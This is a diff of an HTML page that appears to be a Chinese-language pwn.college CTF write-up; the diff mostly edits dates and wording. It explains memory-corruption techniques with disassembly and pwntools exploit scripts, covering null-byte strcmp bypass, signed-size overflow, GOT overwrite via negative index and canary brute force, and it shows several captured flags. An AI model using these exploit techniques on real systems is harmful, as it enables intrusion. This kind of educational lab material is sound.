@@ -30,7 +30,7 @@
 <meta property="og:description" content="Login Leakage (Easy)  Leverage memory corruption to satisfy a simple constraint  Analysis 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-03-27T06:58:01.000Z">
-<meta property="article:modified_time" content="2026-09-08T14:40:47.297Z">
+<meta property="article:modified_time" content="2026-09-15T02:12:09.095Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="memory-corruption">
@@ -235,18 +235,18 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">409</span>
+          <span class="site-state-item-count">532</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">265</span>
+        <span class="site-state-item-count">348</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -319,7 +319,7 @@ p.spoiler {
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-15 10:12:09" itemprop="dateModified" datetime="2026-09-15T10:12:09+08:00">2026-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -374,26 +374,27 @@ p.spoiler {
 <li><strong>Offset</strong>:
 <code>0x7ffca2408746 - 0x7ffca2408560 = 0x1E6</code> (486 bytes)</li>
 </ul>
-<p>先看距离，再看比较逻辑。<code>ltrace</code> 直接把关键点抖出来了:</p>
+<p>先看距离，再看比较逻辑。<code>ltrace</code>
+直接把关键点暴露出来了:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcmp</span>(<span class="string">&quot;123123\n&quot;</span>, <span class="string">&quot;n`\322\232\024\t[,&quot;</span>) = <span class="number">-61</span></span><br></pre></td></tr></table></figure>
 <p>程序直接调用标准库里的 <code>strcmp</code>
 来比较输入和随机生成的密码。<code>strcmp</code>
 比较字符串时，<strong>一遇到 null terminator (<code>\x00</code>)
 就会停止</strong>。</p>
-<p>既然题目不仅禁用了 canary (stack protector)，还允许你输入任意长度的
-payload，底层大概率就是 <code>read()</code> 这种可以读入
+<p>既然题目不仅禁用了 canary (stack protector)，还允许输入任意长度的
+payload，底层很可能就是 <code>read()</code> 这种可以读入
 <code>\x00</code> 的接口，而不是会截断的
-<code>scanf</code>。所以这里根本不用猜密码，直接用 <strong>null byte
-injection</strong> (空字节注入) 让判断逻辑失效就行。</p>
+<code>scanf</code>。因此该题无需猜测密码，直接使用 <strong>null byte
+injection</strong> (空字节注入) 使判断逻辑失效即可。</p>
 <ol type="1">
-<li>如果我们在 <code>input</code> 的第一个字节就写入
-<code>\x00</code>，<code>strcmp</code> 就会认为我们的输入是一个空字符串
+<li>如果在 <code>input</code> 的第一个字节就写入
+<code>\x00</code>，<code>strcmp</code> 就会将该输入视为空字符串
 <code>""</code>。</li>
-<li>因为存在 buffer overflow，我们可以一路把 <code>\x00</code>
-填充过去，跨越那 486 bytes 的距离，顺便把目标 <code>password</code>
-的第一个字节也覆盖成 <code>\x00</code>。</li>
+<li>因为存在 buffer overflow，可以将 <code>\x00</code> 一路填充，跨越
+486 bytes 的距离，一并把目标 <code>password</code> 的第一个字节也覆盖成
+<code>\x00</code>。</li>
 <li>这样一来，<code>password</code> 在 <code>strcmp</code>
-眼里也变成了空字符串 <code>""</code>。</li>
+判定中也等价于空字符串 <code>""</code>。</li>
 </ol>
 <p><strong><code>strcmp("", "") == 0</code>，密码校验直接
 pass。</strong></p>
@@ -407,7 +408,7 @@ pass。</strong></p>
 <h2 id="analysis-1">Analysis</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge&quot;</span> /challenge/login-leakage-hard</span><br><span class="line">            ; CALL XREF from main @ 0x16ff(x)</span><br><span class="line">┌ 396: sym.challenge (int64_t arg1, int64_t arg2, int64_t arg3);</span><br><span class="line">│ `- args(RDI, RSI, RDX) vars(7:sp[0xc..0x1e0])</span><br><span class="line">│           0x000014f2      f30f1efa       endbr64</span><br><span class="line">│           0x000014f6      55             push RBP</span><br><span class="line">│           0x000014f7      4889e5         mov RBP, RSP</span><br><span class="line">│           0x000014fa      4881ece001..   sub RSP, 0x1e0</span><br><span class="line">│           0x00001501      89bd3cfeffff   mov dword [var_1c4h], edi   ; arg1</span><br><span class="line">│           0x00001507      4889b530fe..   mov qword [var_1d0h], RSI   ; arg2</span><br><span class="line">│           0x0000150e      48899528fe..   mov qword [var_1d8h], RDX   ; arg3</span><br><span class="line">│           0x00001515      488d9550fe..   lea RDX, [path]</span><br><span class="line">│           0x0000151c      b800000000     mov eax, 0</span><br><span class="line">│           0x00001521      b933000000     mov ecx, 0x33               ; <span class="string">&#x27;3&#x27;</span></span><br><span class="line">│           0x00001526      4889d7         mov RDI, RDX</span><br><span class="line">│           0x00001529      f348ab         rep stosq qword [RDI], RAX</span><br><span class="line">│           0x0000152c      4889fa         mov RDX, RDI</span><br><span class="line">│           0x0000152f      668902         mov word [RDX], ax</span><br><span class="line">│           0x00001532      4883c202       add RDX, 2</span><br><span class="line">│           0x00001536      be00000000     mov esi, 0                  ; int oflag</span><br><span class="line">│           0x0000153b      488d3dca0b..   lea RDI, str._dev_urandom   ; 0x210c ; <span class="string">&quot;/dev/urandom&quot;</span> ; const char *path</span><br><span class="line">│           0x00001542      b800000000     mov eax, 0</span><br><span class="line">│           0x00001547      e854fcffff     call sym.imp.open           ; int open(const char *path, int oflag)</span><br><span class="line">│           0x0000154c      8945fc         mov dword [fildes], eax</span><br><span class="line">│           0x0000154f      488d8550fe..   lea RAX, [path]</span><br><span class="line">│           0x00001556      488d889201..   lea RCX, [RAX + 0x192]</span><br><span class="line">│           0x0000155d      8b45fc         mov eax, dword [fildes]</span><br><span class="line">│           0x00001560      ba08000000     mov edx, 8                  ; size_t nbyte</span><br><span class="line">│           0x00001565      4889ce         mov RSI, RCX                ; void *buf</span><br><span class="line">│           0x00001568      89c7           mov edi, eax                ; int fildes</span><br><span class="line">│           0x0000156a      e801fcffff     call sym.imp.read           ; ssize_t <span class="built_in">read</span>(int fildes, void *buf, size_t nbyte)</span><br><span class="line">│           0x0000156f      8b45fc         mov eax, dword [fildes]</span><br><span class="line">│           0x00001572      89c7           mov edi, eax                ; int fildes</span><br><span class="line">│           0x00001574      e8e7fbffff     call sym.imp.close          ; int close(int fildes)</span><br><span class="line">│           0x00001579      48c78548fe..   mov qword [nbyte], 0</span><br><span class="line">│           0x00001584      488d3d8e0b..   lea RDI, str.Payload_size:  ; 0x2119 ; <span class="string">&quot;Payload size: &quot;</span> ; const char *format</span><br><span class="line">│           0x0000158b      b800000000     mov eax, 0</span><br><span class="line">│           0x00001590      e8abfbffff     call sym.imp.printf         ; int <span class="built_in">printf</span>(const char *format)</span><br><span class="line">│           0x00001595      488d8548fe..   lea RAX, [nbyte]</span><br><span class="line">│           0x0000159c      4889c6         mov RSI, RAX</span><br><span class="line">│           0x0000159f      488d3d820b..   lea RDI, [0x00002128]       ; <span class="string">&quot;%lu&quot;</span> ; const char *format</span><br><span class="line">│           0x000015a6      b800000000     mov eax, 0</span><br><span class="line">│           0x000015ab      e800fcffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)</span><br><span class="line">│           0x000015b0      488b8548fe..   mov RAX, qword [nbyte]</span><br><span class="line">│           0x000015b7      4889c6         mov RSI, RAX</span><br><span class="line">│           0x000015ba      488d3d6f0b..   lea RDI, str.Send_your_payload__up_to__lu_bytes___n ; 0x2130 ; <span class="string">&quot;Send your payload (up to %lu bytes)!\n&quot;</span> ; const char *format</span><br><span class="line">│           0x000015c1      b800000000     mov eax, 0</span><br><span class="line">│           0x000015c6      e875fbffff     call sym.imp.printf         ; int <span class="built_in">printf</span>(const char *format)</span><br><span class="line">│           0x000015cb      488b9548fe..   mov RDX, qword [nbyte]      ; size_t nbyte</span><br><span class="line">│           0x000015d2      488d8550fe..   lea RAX, [path]</span><br><span class="line">│           0x000015d9      4889c6         mov RSI, RAX                ; void *buf</span><br><span class="line">│           0x000015dc      bf00000000     mov edi, 0                  ; int fildes</span><br><span class="line">│           0x000015e1      e88afbffff     call sym.imp.read           ; ssize_t <span class="built_in">read</span>(int fildes, void *buf, size_t nbyte)</span><br><span class="line">│           0x000015e6      8945f8         mov dword [var_8h], eax</span><br><span class="line">│           0x000015e9      837df800       cmp dword [var_8h], 0</span><br><span class="line">│       ┌─&lt; 0x000015ed      792c           jns 0x161b</span><br><span class="line">│       │   0x000015ef      e81cfbffff     call sym.imp.__errno_location</span><br><span class="line">│       │   0x000015f4      8b00           mov eax, dword [RAX]</span><br><span class="line">│       │   0x000015f6      89c7           mov edi, eax                ; int errnum</span><br><span class="line">│       │   0x000015f8      e8d3fbffff     call sym.imp.strerror       ; char *strerror(int errnum)</span><br><span class="line">│       │   0x000015fd      4889c6         mov RSI, RAX</span><br><span class="line">│       │   0x00001600      488d3d510b..   lea RDI, str.ERROR:_Failed_to_read_input_____s__n ; 0x2158 ; <span class="string">&quot;ERROR: Failed to read input -- %s!\n&quot;</span> ; const char *format</span><br><span class="line">│       │   0x00001607      b800000000     mov eax, 0</span><br><span class="line">│       │   0x0000160c      e82ffbffff     call sym.imp.printf         ; int <span class="built_in">printf</span>(const char *format)</span><br><span class="line">│       │   0x00001611      bf01000000     mov edi, 1                  ; int status</span><br><span class="line">│       │   0x00001616      e8a5fbffff     call sym.imp.exit           ; void <span class="built_in">exit</span>(int status)</span><br><span class="line">│       │   ; CODE XREF from sym.challenge @ 0x15ed(x)</span><br><span class="line">│       └─&gt; 0x0000161b      488d8550fe..   lea RAX, [path]</span><br><span class="line">│           0x00001622      488d909201..   lea RDX, [RAX + 0x192]</span><br><span class="line">│           0x00001629      488d8550fe..   lea RAX, [path]</span><br><span class="line">│           0x00001630      4889d6         mov RSI, RDX                ; const char *s2</span><br><span class="line">│           0x00001633      4889c7         mov RDI, RAX                ; const char *s1</span><br><span class="line">│           0x00001636      e845fbffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)</span><br><span class="line">│           0x0000163b      85c0           <span class="built_in">test</span> eax, eax</span><br><span class="line">│       ┌─&lt; 0x0000163d      7416           je 0x1655</span><br><span class="line">│       │   0x0000163f      488d3d3a0b..   lea RDI, str.Password_check_failed__Exiting_ ; 0x2180 ; <span class="string">&quot;Password check failed! Exiting!&quot;</span> ; const char *s</span><br><span class="line">│       │   0x00001646      e8d5faffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│       │   0x0000164b      bf01000000     mov edi, 1                  ; int status</span><br><span class="line">│       │   0x00001650      e86bfbffff     call sym.imp.exit           ; void <span class="built_in">exit</span>(int status)</span><br><span class="line">│       │   ; CODE XREF from sym.challenge @ 0x163d(x)</span><br><span class="line">│       └─&gt; 0x00001655      488d3d440b..   lea RDI, str.Password_check_passed_ ; 0x21a0 ; <span class="string">&quot;Password check passed!&quot;</span> ; const char *s</span><br><span class="line">│           0x0000165c      e8bffaffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00001661      b800000000     mov eax, 0</span><br><span class="line">│           0x00001666      e880fdffff     call sym.win</span><br><span class="line">│           0x0000166b      488d3d450b..   lea RDI, str.Goodbye_       ; 0x21b7 ; <span class="string">&quot;Goodbye!&quot;</span> ; const char *s</span><br><span class="line">│           0x00001672      e8a9faffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00001677      b800000000     mov eax, 0</span><br><span class="line">│           0x0000167c      c9             leave</span><br><span class="line">└           0x0000167d      c3             ret</span><br></pre></td></tr></table></figure>
 <p>这一题和 Easy 本质一样，还是利用 <code>strcmp</code>
-的字符串终止规则，只是需要先从反汇编里把布局自己抠出来。</p>
+的字符串终止规则，只是需要先从反汇编里把布局自己提取出来。</p>
 <ol type="1">
 <li><strong>随机密码生成逻辑 (0x154f - 0x156a):</strong>
 <ul>
@@ -417,21 +418,22 @@ pass。</strong></p>
 <code>path + 0x192</code>。</li>
 <li><code>call sym.imp.read</code>：从 <code>/dev/urandom</code> 读取 8
 bytes 写入到 <code>path + 0x192</code>。</li>
-<li><strong>结论</strong>：真正的密码存放位置是相对于你输入缓冲区的偏移量
+<li><strong>结论</strong>：真正的密码存放位置是相对于输入缓冲区的偏移量
 <code>0x192</code> 处。</li>
 </ul></li>
 <li><strong>输入控制权交接 (0x159f - 0x15ab):</strong>
 <ul>
-<li>程序用 <code>scanf("%lu")</code> 让你自己输入后续要读取的
-<code>Payload size</code> (<code>nbyte</code>)。没有做任何边界检查
-(bounds checking)，很典型的代码。</li>
+<li>程序用 <code>scanf("%lu")</code> 获取后续要读取的
+<code>Payload size</code>
+(<code>nbyte</code>)，该值由输入提供。没有做任何边界检查 (bounds
+checking)，很典型的代码。</li>
 </ul></li>
 <li><strong>buffer overflow 发生地 (0x15d2 - 0x15e1):</strong>
 <ul>
 <li><code>mov RSI, RAX</code> (其中 RAX 是 <code>path</code>
 的地址)</li>
 <li><code>call sym.imp.read</code>：从标准输入 (<code>fd=0</code>)
-读取你指定长度 (<code>nbyte</code>) 的数据，直接怼进 <code>path</code>
+读取指定长度 (<code>nbyte</code>) 的数据，直接写入 <code>path</code>
 的头部。</li>
 </ul></li>
 <li><strong>致命的比较 (0x161b - 0x1636):</strong>
@@ -439,17 +441,17 @@ bytes 写入到 <code>path + 0x192</code>。</li>
 <li><code>mov RDI, RAX</code> (<code>s1</code> = <code>path</code>)</li>
 <li><code>mov RSI, RDX</code> (<code>s2</code> =
 <code>path + 0x192</code>)</li>
-<li><code>call sym.imp.strcmp</code>：程序居然又用了
-<code>strcmp</code>！</li>
+<li><code>call sym.imp.strcmp</code>：程序再次使用了
+<code>strcmp</code>。</li>
 </ul></li>
 </ol>
 <p>利用思路:</p>
 <ol type="1">
 <li>计算偏移：<code>0x192</code> 转换为十进制就是 <strong>402</strong>
 bytes。</li>
-<li>利用不受限制的 <code>read</code>，往缓冲区塞满
+<li>利用不受限制的 <code>read</code>，往缓冲区填满
 <code>\x00</code>。</li>
-<li>第 1 个 <code>\x00</code> 会让 <code>path</code> (你的输入) 被
+<li>第 1 个 <code>\x00</code> 会让 <code>path</code> (输入) 被
 <code>strcmp</code> 视为空字符串 <code>""</code>。</li>
 <li>第 403 个 <code>\x00</code> 会精准覆盖掉 <code>path + 0x192</code>
 (随机密码) 的第一个字节，让密码也被视为空字符串 <code>""</code>。</li>
@@ -485,11 +487,11 @@ world</strong>。一旦这两个世界之间发生类型转换，检查就失效
 绕过检查后，程序会调用底层系统调用，比如
 <code>read(0, buffer, size)</code>。<code>read</code> 的第三个参数类型是
 <code>size_t</code> (unsigned)。</p>
-<p>当你输入 <code>-1</code> 时，有符号的安全检查会认为
-<code>-1 &lt; 63</code>，合法直接放行。但当 <code>-1</code> 被传递给
-<code>read()</code> 并被强制类型转换为无符号的 <code>size_t</code>
-时，在 Two's Complement (二进制补码) 的规则下，<code>-1</code>
-的内存表示 <code>0xffffffffffffffff</code>
+<p>输入 <code>-1</code> 时，有符号的安全检查会认为
+<code>-1 &lt; 63</code>，判定为合法并直接放行。但当 <code>-1</code>
+被传递给 <code>read()</code> 并被强制类型转换为无符号的
+<code>size_t</code> 时，在 Two's Complement (二进制补码)
+的规则下，<code>-1</code> 的内存表示 <code>0xffffffffffffffff</code>
 会变成一个极其巨大的正数。</p>
 <h2 id="exploit-2">Exploit</h2>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/bounds-breaker-easy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x7ffea42aa208</span> - <span class="number">0x7ffea42aa1b0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x90&#x27;</span> * padding + p64(<span class="number">0x40198c</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -575,9 +577,9 @@ bytes that redirect the stack string pointer into the flag buffer in
 <p>Leverage an Array to obtain the flag.</p>
 </blockquote>
 <h2 id="analysis-8">Analysis</h2>
-<p>这题其实是 <strong>OOB
+<p>这题实际是 <strong>OOB
 read</strong>，只是包装成“查看数组元素”。数组在栈的高地址，flag
-在更低的地址，所以思路是使用 <strong>negative index</strong>。</p>
+在更低的地址，因此思路是使用 <strong>negative index</strong>。</p>
 <ul>
 <li>array start: <code>0x7fffcfc10c98</code></li>
 <li>flag address: <code>0x7fffcfc106d0</code></li>
@@ -626,8 +628,8 @@ the flag from memory.</p>
 <p><strong>解法：offset jump (偏移跳转)</strong></p>
 <p>看看 <code>win</code> 函数开头：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x00001e84      f30f1efa       endbr64</span><br><span class="line">0x00001e88      55             push RBP</span><br><span class="line">0x00001e89      4889e5         mov RBP, RSP</span><br><span class="line">0x00001e8c      488d3d7511..   lea RDI, str.You_win__Here_is_your_flag:</span><br><span class="line">0x00001e93      e878f2ffff     call sym.imp.puts     &lt;-- 死循环点</span><br><span class="line">0x00001e98      be00000000     mov esi, 0            &lt;-- 我们从这里开始！</span><br></pre></td></tr></table></figure>
-<p>如果我们把 <code>puts@GOT</code> 覆盖为 <code>win_addr + 0x14</code>
-(即 <code>0x1e98</code>)，就能绕过死循环。</p>
+<p>将 <code>puts@GOT</code> 覆盖为 <code>win_addr + 0x14</code> (即
+<code>0x1e98</code>)，即可绕过死循环。</p>
 <h2 id="exploit-10">Exploit</h2>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;/challenge/now-you-got-it-hard&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;/challenge/now-you-got-it-hard&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># array starts at 0x5dd0 relative</span></span><br><span class="line">index = (elf.got[<span class="string">&quot;puts&quot;</span>] - <span class="number">0x5dd0</span>) // <span class="number">8</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;FREE LEAK: win is located at: &quot;</span>)</span><br><span class="line">win_addr = <span class="built_in">int</span>(p.recvline().strip(), <span class="number">16</span>) + <span class="number">0x14</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Which number would you like to view? &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;What number would you like to replace it with? &quot;</span>, <span class="built_in">str</span>(win_addr).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{4R4AKNBLpYoKyJi6oIUwiWfpZI5.QX3gzN4EDL4cjM1gzW}</span></span>
@@ -645,14 +647,14 @@ time in a PIE binary with a stack canary.</p>
 <li><code>n</code> -&gt; <code>0x7fff2243c83c</code> (offset 92)</li>
 <li>return address -&gt; <code>0x7fff2243c858</code> (offset 120)</li>
 </ul>
-<p>我们覆盖 <code>n</code> 为 119，下一次 <code>read</code> 就会写入到
+<p>将 <code>n</code> 覆盖为 119，下一次 <code>read</code> 就会写入到
 <code>input + 120</code>，即 return address 的位置。</p>
 <h2 id="exploit-11">Exploit</h2>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># padding to n</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">92</span> + p8(<span class="number">119</span>) + p16(<span class="number">0x1CF9</span>) <span class="comment"># target win_authed check skip</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/loop-lunacy-easy&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;122&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{cTAXWFaqIFSJDGH8jZMVtQUXTPF.0VNwMDL4cjM1gzW}</span></span>
 <h1 id="loop-lunacy-hard">Loop Lunacy (Hard)</h1>
 <h2 id="analysis-13">Analysis</h2>
-<p>Hard 版还是同样的单字节循环写入，只是局部变量布局稍微绕一点。</p>
+<p>Hard 版还是同样的单字节循环写入，只是局部变量布局稍复杂。</p>
 <ul>
 <li><code>buf</code> -&gt; <code>RBP - 0x40</code> (64 bytes)</li>
 <li><code>n</code> -&gt; <code>RBP - 0x58</code></li>
@@ -751,7 +753,7 @@ buffer，但残留内容还躺在栈上。</p>
 PIE binary.</p>
 </blockquote>
 <h2 id="analysis-20">Analysis</h2>
-<p>利用<strong>未初始化栈内容</strong>去捞一份 canary 副本。</p>
+<p>利用<strong>未初始化栈内容</strong>去提取一份 canary 副本。</p>
 <ul>
 <li><code>buf</code> -&gt; <code>0x7ffd91a01960</code></li>
 <li>canary copy at <code>0x7ffd91a019e8</code></li>
@@ -777,9 +779,8 @@ PIE binary.</p>
 fork server in the target binary.</p>
 </blockquote>
 <h2 id="analysis-22">Analysis</h2>
-<p>fork 出来的子进程会继承父进程的
-canary。我们可以通过<strong>逐字节爆破 (byte-by-byte
-brute-force)</strong> 来获取 canary。</p>
+<p>fork 出来的子进程会继承父进程的 canary。可通过<strong>逐字节爆破
+(byte-by-byte brute-force)</strong> 获取 canary。</p>
 <ul>
 <li><code>buf</code> to <code>canary</code> offset = 120 bytes</li>
 </ul>
